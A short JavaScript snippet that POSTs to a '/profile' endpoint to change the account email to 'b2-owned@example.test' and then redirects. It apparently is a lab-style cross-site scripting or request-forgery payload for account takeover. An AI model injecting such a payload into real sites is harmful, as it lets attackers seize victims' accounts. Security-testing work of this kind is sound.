fetch("/profile", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "email=b2-owned@example.test"
}).then(() => {
  window.location.href = "/profile";
});